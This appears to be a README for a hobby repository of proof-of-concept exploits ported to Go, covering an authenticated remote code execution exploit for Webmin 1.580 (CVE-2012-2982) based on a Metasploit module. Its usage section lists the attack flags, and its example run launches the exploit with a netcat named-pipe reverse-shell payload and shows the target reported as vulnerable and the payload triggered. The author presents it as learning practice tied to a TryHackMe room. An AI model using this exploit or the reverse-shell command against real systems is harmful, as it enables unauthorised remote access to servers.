# PoC scripts in GO

Various PoC scripts rewritten in GO.

I am learning GO. Inspired by [this TryHackMe
room](https://tryhackme.com/room/intropocscripting), I have decided to rewrite
PoC scripts in GO as practice.

## CVE-2012-2982 Webmin 1.580 RCE

Webmin 1.580 /file/show.cgi authenticated remote code execution (CVE-2012-2982).
This script is based on [the exploits/unix/webapp/webmin_show_cgi_exec module in
Metasploit](https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_show_cgi_exec/).
The original source code can be found [on Metasploit's Github
repo](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb).


### Usage

```
$ go run main.go
Usage of /tmp/main:
  -password string
    	Password for authentication, required
  -path string
    	Root path of the target application, default: "/" (default "/")
  -payload string
    	Payload, required
  -rhost string
    	IP of target application, required
  -rport int
    	Port number of target application, required (default -1)
  -ssl
    	Enable SSL, default: off
  -username string
    	Username for authentication, required
  -verbose
    	Enable verbosity, default: off
```

Or build a static binary with `go build` if you wish.

### Examples

```
$ go run main.go -rhost 127.0.0.1 -rport 80 -username root -password toor -payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f"
[*] Logging in
[i] Authentication successful. Received session ID: 796d606631398933b534a97901a0ad03
[*] Running vulnerability check
[i] Target is vulnerable
[*] Triggering payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f
[i] Finished
```

Add the `-verbose` flag if you wish detailed outputs.

Add the `-ssl` flag if application uses HTTPS instead of HTTP.

Add the `-path <PATH>` flag if the target application does not run on the
server's root (/) page.
